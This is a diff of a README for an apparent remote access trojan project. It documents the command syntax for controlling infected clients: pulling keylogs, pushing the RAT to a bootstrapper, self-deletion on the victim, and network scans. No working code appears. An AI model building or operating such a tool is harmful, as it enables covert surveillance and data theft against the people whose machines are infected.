@@ -9,44 +9,9 @@ They will be broken up into sections separated by a space.
 
 \<machine\> \<command\> \<options\> ....
 
-### Examples
+### Commands for demo
 
-client1 get file keylog
-client1 get IP
-client1 test -- tests connection to RAT
-client1 delete rat -- RAT on victim deletes itself
-server shutdown
-client1 send file RAT -- sends RAT to bootstrapper
-server startnetworkscan
-
-For Leon:
-
-list of methods:
-getCommand() take user input as string, turn it into a String[]
-parseMachine(String[] args) 
-checks first word to see if = server or != server
-
-if != server, send the rest of the command to the specified client.
-...
-...
-...
-
-Server.parseCommand()
-check first word of array
-if = server
-    Server.parseSecondWord()
-else
-    find client with correct name
-    run Client.parseSecondWord()
-    
-## Available Commands
-
-### Server
-* startscan //Starts the network Scanner
-* stopscan // Stops the network Scanner
-
-### Client
-* pushClient
-* pushFile
-* PullKeyLog
-* getClientName
+client1 push RAT
+client1 pull keyLog
+server list clients
+client1 test
